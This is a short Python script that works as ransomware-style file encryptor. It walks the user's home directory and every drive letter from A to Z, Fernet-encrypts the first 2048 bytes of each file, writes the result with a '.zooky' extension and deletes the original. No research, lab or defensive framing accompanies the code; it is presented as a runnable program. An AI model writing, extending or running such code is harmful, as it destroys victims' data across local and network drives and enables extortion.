import os
from cryptography.fernet import Fernet
from pathlib import Path

class Encryptor:
    def __init__(self, key):
        self.fernet = Fernet(key)

    def encrypt_file(self, filepath):
        with open(filepath, 'rb') as file:
            original = file.read(2048)
            rest_of_file = file.read()
        encrypted = self.fernet.encrypt(original)
        with open(filepath + '.zooky', 'wb') as encrypted_file:
            encrypted_file.write(encrypted + rest_of_file)
        os.remove(filepath)

    def encrypt_directory(self, directory):
        for path, subdirs, files in os.walk(directory):
            for name in files:
                filepath = os.path.join(path, name)
                self.encrypt_file(filepath)

    def encrypt_critical_directories(self):
        # Encrypt the user's home directory
        user_home = str(Path.home())
        print(f"Encrypting user directory: {user_home}")
        self.encrypt_directory(user_home)

        # Encrypt network drives (assuming they are mapped)
        for drive in range(ord('A'), ord('Z') + 1):
            drive_letter = chr(drive)
            drive_path = f"{drive_letter}:\\"
            if os.path.exists(drive_path) and not os.path.samefile(drive_path, user_home):
                print(f"Encrypting network drive: {drive_path}")
                self.encrypt_directory(drive_path)

def main():
    key = load_key()
    encryptor = Encryptor(key)
    encryptor.encrypt_critical_directories()

def load_key(file_path='filekey.key'):
    with open(file_path, 'rb') as filekey:
        return filekey.read()

if __name__ == "__main__":
    main() 